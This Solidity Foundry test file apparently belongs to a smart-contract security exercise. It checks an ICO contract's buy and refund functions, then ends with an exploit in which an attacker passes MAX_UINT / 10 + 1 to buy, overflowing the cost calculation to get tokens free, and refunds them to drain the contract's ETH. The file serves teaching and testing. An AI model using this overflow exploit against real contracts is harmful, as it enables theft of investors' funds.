//SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma abicoder v2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/arithmetic-overflows-3/AIvestICO.sol";
import {IERC20} from "../../src/arithmetic-overflows-3/AIvestToken.sol";

/**
@dev run "forge test --match-contract AO2" 
*/
contract TestAO3 is Test {
    AIvestICO ico;

    uint256 constant MAX_UINT = (2 ** 256 - 1);
    uint public constant FIRST_INVESTOR_INVESTED = 520 ether;
    uint public constant SECOND_INVESTOR_INVESTED = 126 ether;
    uint public constant THIRD_INVESTOR_INVESTED = 54 ether;
    uint public constant SECOND_INVESTOR_REFUNDED = 26 ether;
    uint public constant TOTAL_INVESTED =
        FIRST_INVESTOR_INVESTED + SECOND_INVESTOR_INVESTED + THIRD_INVESTOR_INVESTED - SECOND_INVESTOR_REFUNDED;

    address deployer;
    address investor1;
    address investor2;
    address investor3;
    address attacker;

    uint256 attacker1Balance;

    function setUp() public {
        deployer = address(1);
        investor1 = address(2);
        investor2 = address(3);
        investor3 = address(4);
        attacker = address(5);

        vm.deal(attacker, 1 ether);
        assertEq(attacker.balance, 1 ether);

        vm.deal(investor1, 1000 ether);
        vm.deal(investor2, 1000 ether);
        vm.deal(investor3, 1000 ether);

        vm.prank(deployer);
        ico = new AIvestICO();
    }

    function test() public {
        console.log("Investment Tests...");

        // Should Fail (no ETH)
        vm.startPrank(investor1);
        vm.expectRevert();
        ico.buy(FIRST_INVESTOR_INVESTED * 10);
        vm.stopPrank();

        // Should Succeed
        vm.prank(investor1);
        ico.buy{value: FIRST_INVESTOR_INVESTED}(FIRST_INVESTOR_INVESTED * 10);
        vm.prank(investor2);
        ico.buy{value: SECOND_INVESTOR_INVESTED}(SECOND_INVESTOR_INVESTED * 10);
        vm.prank(investor3);
        ico.buy{value: THIRD_INVESTOR_INVESTED}(THIRD_INVESTOR_INVESTED * 10);

        // Tokens and ETH balance checks
        assertEq(IERC20(address(ico.token())).balanceOf(investor1), FIRST_INVESTOR_INVESTED * 10);
        assertEq(IERC20(address(ico.token())).balanceOf(investor2), SECOND_INVESTOR_INVESTED * 10);
        assertEq(IERC20(address(ico.token())).balanceOf(investor3), THIRD_INVESTOR_INVESTED * 10);

        assertEq(address(ico).balance, FIRST_INVESTOR_INVESTED + SECOND_INVESTOR_INVESTED + THIRD_INVESTOR_INVESTED);
        console.log("Investment Tests Successful");

        console.log("Refund Tests...");

        vm.startPrank(investor2);

        vm.expectRevert();
        // Should Fail (investor doesn't own so many tokens)
        ico.refund(SECOND_INVESTOR_REFUNDED * 100);
        // Should succeed
        ico.refund(SECOND_INVESTOR_REFUNDED * 10);

        vm.stopPrank();

        // Tokens and ETH balance check
        assertEq(address(ico).balance, TOTAL_INVESTED);
        assertEq(
            IERC20(address(ico.token())).balanceOf(investor2),
            (SECOND_INVESTOR_INVESTED - SECOND_INVESTOR_REFUNDED) * 10
        );
        console.log("Refund Tests Successful");

        console.log("Exploiting...");

        vm.startPrank(attacker);

        uint256 val = MAX_UINT / 10 + 1;
        ico.buy(val);

        uint256 refund = 674 ether * 10;
        ico.refund(refund);

        vm.stopPrank();

        // Attacker should drain all ETH from ICO contract
        assertEq(address(ico).balance, 0);
        assertEq(address(attacker).balance >= TOTAL_INVESTED, true);
        
        console.log("Exploit Successful");
    }
}
